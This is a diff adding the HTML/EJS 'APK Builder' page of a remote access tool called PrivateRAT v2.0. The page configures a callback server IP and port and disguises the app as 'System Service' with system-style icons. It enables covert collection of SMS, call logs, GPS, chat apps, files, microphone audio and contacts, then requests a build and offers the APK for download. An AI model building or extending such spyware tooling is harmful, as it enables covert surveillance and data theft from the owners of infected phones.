@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>APK Builder - PrivateRAT v2.0</title>
+  <link rel="stylesheet" href="/css/semantic.min.css">
+  <link rel="stylesheet" href="/css/custom.css">
+  <link rel="stylesheet" href="/css/design-system.css">
+  <link rel="stylesheet" href="/css/sidebar.css">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <style>
+    .builder-container {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    .form-section {
+      background: white;
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    }
+
+    .form-section h3 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #2d3748;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding-bottom: 16px;
+      border-bottom: 2px solid #e2e8f0;
+    }
+
+    .form-section h3 i {
+      color: #667eea;
+      font-size: 24px;
+    }
+
+    .form-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+    }
+
+    .checkbox-field {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px;
+      background: #f7fafc;
+      border-radius: 10px;
+      transition: all 0.3s;
+    }
+
+    .checkbox-field:hover {
+      background: #edf2f7;
+    }
+
+    .checkbox-field input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+    }
+
+    .checkbox-field label {
+      font-size: 14px;
+      font-weight: 500;
+      color: #2d3748;
+      cursor: pointer;
+      flex: 1;
+    }
+
+    .build-actions {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .build-button {
+      padding: 14px 28px;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: white;
+    }
+
+    .build-button.primary {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+    }
+
+    .build-button.primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+    }
+
+    .build-button.secondary {
+      background: linear-gradient(135deg, #ed8936 0%, #dd6b20 100%);
+    }
+
+    .progress-section {
+      background: white;
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      display: none;
+    }
+
+    .build-status {
+      font-size: 16px;
+      font-weight: 600;
+      color: #2d3748;
+      margin-bottom: 16px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: #e2e8f0;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+      width: 0%;
+      transition: width 0.5s ease;
+      border-radius: 4px;
+    }
+
+    .build-log {
+      background: #1a202c;
+      color: #a0aec0;
+      padding: 20px;
+      border-radius: 10px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      max-height: 200px;
+      overflow-y: auto;
+      line-height: 1.8;
+    }
+
+    .build-log div {
+      margin-bottom: 4px;
+    }
+
+    .download-section {
+      background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
+      border-radius: 16px;
+      padding: 40px;
+      text-align: center;
+      color: white;
+      box-shadow: 0 10px 30px rgba(72, 187, 120, 0.3);
+      display: none;
+    }
+
+    .download-section h3 {
+      font-size: 24px;
+      margin-bottom: 12px;
+      border: none;
+      padding: 0;
+      color: white;
+    }
+
+    .download-button {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 14px 28px;
+      background: white;
+      color: #48bb78;
+      border-radius: 12px;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.3s;
+      margin-top: 20px;
+    }
+
+    .download-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+    }
+  </style>
+  <script src="/js/jquery-3.4.1.min.js"></script>
+  <script src="/js/semantic.min.js"></script>
+</head>
+<body>
+  <button class="mobile-toggle" onclick="toggleSidebar()">
+    <i class="bars icon"></i>
+  </button>
+
+  <div class="app-container">
+    <%- include('partials/sidebar.ejs', { activePage: 'builder' }) %>
+
+    <div class="main-content">
+      <div class="page-header">
+        <h1 class="page-title">APK Builder</h1>
+        <p class="page-subtitle">Build and customize Android APK for device monitoring</p>
+      </div>
+
+      <div class="builder-container">
+        <!-- Server Configuration -->
+        <div class="form-section">
+          <h3><i class="server icon"></i> Server Configuration</h3>
+          <div class="form-grid">
+            <div class="form-group">
+              <label class="form-label">Server IP / Domain</label>
+              <input type="text" id="serverIP" class="form-input" placeholder="192.168.1.100 or example.com" value="localhost">
+            </div>
+            <div class="form-group">
+              <label class="form-label">Server Port</label>
+              <input type="number" id="serverPort" class="form-input" placeholder="8080" value="<%= myPort || 22222 %>" min="1" max="65535">
+            </div>
+            <div class="form-group">
+              <label class="form-label">Protocol</label>
+              <select id="serverProtocol" class="form-select">
+                <option value="http">HTTP</option>
+                <option value="https">HTTPS</option>
+              </select>
+            </div>
+          </div>
+        </div>
+
+        <!-- APK Configuration -->
+        <div class="form-section">
+          <h3><i class="android icon"></i> APK Configuration</h3>
+          <div class="form-grid">
+            <div class="form-group">
+              <label class="form-label">Package Name</label>
+              <input type="text" id="packageName" class="form-input" placeholder="com.example.app" value="com.privaterat.client">
+            </div>
+            <div class="form-group">
+              <label class="form-label">App Version</label>
+              <input type="text" id="appVersion" class="form-input" placeholder="1.0.0" value="1.0.0">
+            </div>
+            <div class="form-group">
+              <label class="form-label">App Name</label>
+              <input type="text" id="appName" class="form-input" placeholder="System Service" value="System Service">
+            </div>
+            <div class="form-group">
+              <label class="form-label">App Icon</label>
+              <select id="appIcon" class="form-select">
+                <option value="default">Default Icon</option>
+                <option value="settings">Settings Icon</option>
+                <option value="system">System Icon</option>
+                <option value="service">Service Icon</option>
+              </select>
+            </div>
+          </div>
+        </div>
+
+        <!-- Features Configuration -->
+        <div class="form-section">
+          <h3><i class="cogs icon"></i> Features Configuration</h3>
+          <div class="checkbox-grid">
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableCalls" checked>
+              <label for="enableCalls"><i class="phone icon"></i> Call Logs</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableSMS" checked>
+              <label for="enableSMS"><i class="comment icon"></i> SMS Monitoring</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableNotifications" checked>
+              <label for="enableNotifications"><i class="bell icon"></i> Notifications</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableGPS" checked>
+              <label for="enableGPS"><i class="map marker icon"></i> GPS Location</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableChatApps" checked>
+              <label for="enableChatApps"><i class="comments icon"></i> Chat Apps</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableFileManager" checked>
+              <label for="enableFileManager"><i class="folder icon"></i> File Manager</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableMicrophone" checked>
+              <label for="enableMicrophone"><i class="microphone icon"></i> Microphone</label>
+            </div>
+            <div class="checkbox-field">
+              <input type="checkbox" id="enableContacts" checked>
+              <label for="enableContacts"><i class="address book icon"></i> Contacts</label>
+            </div>
+          </div>
+        </div>
+
+        <!-- Build Options -->
+        <div class="form-section">
+          <h3><i class="wrench icon"></i> Build Options</h3>
+          <div class="form-grid">
+            <div class="form-group">
+              <label class="form-label">Build Type</label>
+              <select id="buildType" class="form-select">
+                <option value="debug">Debug (Unsigned)</option>
+                <option value="release">Release (Signed)</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Target Android</label>
+              <select id="targetAndroid" class="form-select">
+                <option value="21">Android 5.0 (API 21)</option>
+                <option value="23">Android 6.0 (API 23)</option>
+                <option value="26">Android 8.0 (API 26)</option>
+                <option value="29" selected>Android 10 (API 29)</option>
+                <option value="30">Android 11 (API 30)</option>
+                <option value="33">Android 13 (API 33)</option>
+              </select>
+            </div>
+          </div>
+          <div class="form-group">
+            <label class="form-label">Additional Notes</label>
+            <textarea id="buildNotes" class="form-textarea" rows="3" placeholder="Any additional notes for this build..."></textarea>
+          </div>
+        </div>
+
+        <!-- Build Actions -->
+        <div class="form-section">
+          <h3><i class="play icon"></i> Build Actions</h3>
+          <div class="build-actions">
+            <button class="build-button primary" id="buildBtn" type="button">
+              <i class="download icon"></i> Build APK
+            </button>
+            <button class="build-button secondary" onclick="resetForm()" type="button">
+              <i class="refresh icon"></i> Reset Form
+            </button>
+          </div>
+        </div>
+
+        <!-- Build Progress -->
+        <div class="progress-section" id="progressSection">
+          <h3><i class="spinner loading icon"></i> Build Progress</h3>
+          <div class="build-status" id="buildStatus">Initializing build process...</div>
+          <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+          <div class="build-log" id="buildLog">
+            <div>> Starting APK build process...</div>
+          </div>
+        </div>
+
+        <!-- Download Section -->
+        <div class="download-section" id="downloadSection">
+          <h3><i class="check circle icon"></i> Build Complete!</h3>
+          <p style="opacity: 0.9; margin-bottom: 20px;">
+            Your APK has been built successfully. Click the button below to download.
+          </p>
+          <a href="#" class="download-button" id="downloadBtn">
+            <i class="download icon"></i> Download APK
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    console.log('Builder script loaded');
+
+    function toggleSidebar() {
+      const sidebar = document.getElementById('sidebar');
+      sidebar.classList.toggle('open');
+    }
+
+    document.addEventListener('click', function(event) {
+      const sidebar = document.getElementById('sidebar');
+      const mobileToggle = document.querySelector('.mobile-toggle');
+      if (window.innerWidth <= 768 && 
+          !sidebar.contains(event.target) && 
+          !mobileToggle.contains(event.target)) {
+        sidebar.classList.remove('open');
+      }
+    });
+
+    function validateForm() {
+      console.log('Validating form...');
+      const serverIP = document.getElementById('serverIP').value.trim();
+      const serverPort = document.getElementById('serverPort').value.trim();
+      const packageName = document.getElementById('packageName').value.trim();
+      
+      if (!serverIP) {
+        alert('Please enter server IP address or domain');
+        return false;
+      }
+      
+      if (!serverPort || serverPort < 1 || serverPort > 65535) {
+        alert('Please enter a valid server port (1-65535)');
+        return false;
+      }
+      
+      if (!packageName) {
+        alert('Please enter package name');
+        return false;
+      }
+      
+      return true;
+    }
+
+    function startBuild() {
+      console.log('startBuild called');
+      if (!validateForm()) {
+          console.log('Validation failed');
+          return;
+      }
+      
+      const serverIP = document.getElementById('serverIP').value.trim();
+      const serverPort = document.getElementById('serverPort').value.trim();
+      const serverProtocol = document.getElementById('serverProtocol').value;
+      
+      const buildBtn = document.getElementById('buildBtn');
+      const progressSection = document.getElementById('progressSection');
+      const downloadSection = document.getElementById('downloadSection');
+      const buildLog = document.getElementById('buildLog');
+      const buildStatus = document.getElementById('buildStatus');
+      const progressFill = document.getElementById('progressFill');
+      
+      progressSection.style.display = 'block';
+      downloadSection.style.display = 'none';
+      buildBtn.disabled = true;
+      buildBtn.innerHTML = '<i class="spinner loading icon"></i> Building...';
+      
+      // Fake progress animation
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+          if (progress < 90) {
+              progress += 2; // Slower progress
+              progressFill.style.width = progress + '%';
+          }
+      }, 500);
+
+      buildLog.innerHTML = '<div>> Starting build process...</div>';
+      buildStatus.textContent = 'Building APK on server (this may take a while)...';
+
+      console.log('Sending fetch request to /build');
+      // Send request
+      fetch('/build', {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+              uri: serverIP,
+              port: serverPort,
+              protocol: serverProtocol
+          })
+      })
+      .then(response => {
+          console.log('Response received:', response.status);
+          if (!response.ok) {
+              return response.json().then(err => { throw new Error(err.error || 'Server error'); });
+          }
+          return response.json();
+      })
+      .then(data => {
+          console.log('Data received:', data);
+          clearInterval(progressInterval);
+          if (data.success) {
+              progressFill.style.width = '100%';
+              buildStatus.textContent = 'Build Complete!';
+              buildLog.innerHTML += '<div>> Build successful!</div>';
+              buildComplete(data.downloadUrl);
+          } else {
+              throw new Error(data.error || 'Unknown error');
+          }
+      })
+      .catch(error => {
+          console.error('Build error:', error);
+          clearInterval(progressInterval);
+          progressFill.style.background = '#e53e3e';
+          buildStatus.textContent = 'Build Failed';
+          buildLog.innerHTML += `<div style="color: #fc8181">> Error: ${error.message}</div>`;
+          buildBtn.disabled = false;
+          buildBtn.innerHTML = '<i class="download icon"></i> Retry Build';
+          alert('Build failed: ' + error.message);
+      });
+    }
+
+    function buildComplete(url) {
+      const buildBtn = document.getElementById('buildBtn');
+      const downloadSection = document.getElementById('downloadSection');
+      const downloadBtn = document.getElementById('downloadBtn');
+      
+      buildBtn.disabled = false;
+      buildBtn.innerHTML = '<i class="download icon"></i> Build APK';
+      downloadSection.style.display = 'block';
+      downloadBtn.href = url || '/app-release.apk';
+      downloadBtn.download = 'privaterat-client.apk';
+    }
+
+    function resetForm() {
+      document.getElementById('serverIP').value = window.location.hostname || 'localhost';
+      document.getElementById('serverPort').value = '<%= myPort || 22222 %>';
+      document.getElementById('serverProtocol').value = 'http';
+      document.getElementById('packageName').value = 'com.privaterat.client';
+      document.getElementById('appVersion').value = '1.0.0';
+      document.getElementById('appName').value = 'System Service';
+      document.getElementById('appIcon').value = 'default';
+      document.getElementById('buildType').value = 'debug';
+      document.getElementById('targetAndroid').value = '29';
+      document.getElementById('buildNotes').value = '';
+      
+      document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
+        checkbox.checked = true;
+      });
+      
+      document.getElementById('progressSection').style.display = 'none';
+      document.getElementById('downloadSection').style.display = 'none';
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      console.log('DOM Content Loaded');
+      document.getElementById('serverIP').value = window.location.hostname || 'localhost';
+      
+      // Attach event listener explicitly
+      const btn = document.getElementById('buildBtn');
+      if (btn) {
+          console.log('Build button found, attaching listener');
+          btn.addEventListener('click', startBuild);
+      } else {
+          console.error('Build button NOT found');
+      }
+    });
+  </script>
+</body>
+</html>
